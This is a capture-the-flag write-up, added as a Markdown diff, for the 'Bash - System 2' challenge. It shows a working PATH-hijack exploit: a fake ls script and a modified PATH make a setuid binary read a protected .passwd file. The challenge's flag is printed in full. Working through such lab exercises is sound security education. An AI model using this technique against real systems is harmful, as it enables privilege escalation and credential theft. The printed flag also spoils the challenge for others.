@@ -1,0 +1,42 @@
+---
+tags: []
+---
+# Bash - System 2
+
+- **Description:** Simple script
+- **Difficulty:** Very easy
+
+---
+
+## 🔎 Solution
+This challenge is quite similar to the **Bash - System 1** challenge, although the exploitation method here is slightly more involved.
+
+When the user executes the `ch12` binary, it internally runs `ls -lA ...`.
+```
+int main(){
+    setreuid(geteuid(), geteuid());
+    system("ls -lA /challenge/app-script/ch12/.passwd");
+    return 0;
+}
+```
+Our goal is to access the contents of the `.passwd` file. 
+To achieve that, we can take advantage of how the `system()` function relies on the environment's **$PATH** variable to locate binaries like `ls`.
+
+We'll approach this by creating *a fake ls* script that actually runs cat, then modify $PATH so that the program executes our version instead of the real `/bin/ls`.
+1. Create a fake ls script:
+```
+echo '#!/bin/sh' > /tmp/mybin/ls
+echo 'cat /challenge/app-script/ch12/.passwd' >> /tmp/mybin/ls
+chmod +x /tmp/mybin/ls
+```
+This script mimics `ls`, but instead prints the contents of the target file.
+
+2. Execute the binary with the modified $PATH:
+```
+app-script-ch12@challenge02:~$ PATH=/tmp/mybin:$PATH ./ch12
+8a95eDS/*e_T#
+```
+And just like that, the program runs our fake ls, revealing the flag.
+
+## 🚩Flag
+> `8a95eDS/*e_T#`
